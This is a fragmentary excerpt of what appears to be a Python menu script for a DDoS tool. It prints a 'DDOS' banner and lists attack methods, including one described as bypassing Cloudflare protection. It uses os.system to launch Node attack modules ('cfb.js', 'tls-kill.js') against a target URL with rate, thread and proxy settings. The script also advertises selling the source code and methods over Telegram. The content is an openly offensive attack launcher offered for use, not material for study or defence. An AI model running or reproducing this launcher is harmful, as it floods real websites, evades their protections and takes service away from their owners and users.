...
def title():
  print(f"DDOS | bot: {bots} | admin | free : True ")
...
http-raw : good
tls-kill : powerfull
cfb : bypass cloudfare protection-weak
...
| ▓▓  | ▓▓\▓▓     \ ▓▓ ▓▓    ▓▓
 \▓▓   \▓▓ \▓▓▓▓▓▓▓\▓▓ ▓▓▓▓▓▓▓ 
  ...
  XD when your attack require method choose GET or POST or HEAD
  
  if you want to buy source code and method, ddos script dm me 
  telegram : Fockett199
  """)
  command()
...
TIME : 180
    ...
    """)
    os.system(f'node module/cfb.js {url} 180 ')
...
TIME : 180
    ...
    """)
    os.system(f'node module/tls-kill.js {url} 180 {rate} {threads} proxies.txt')
    brain()
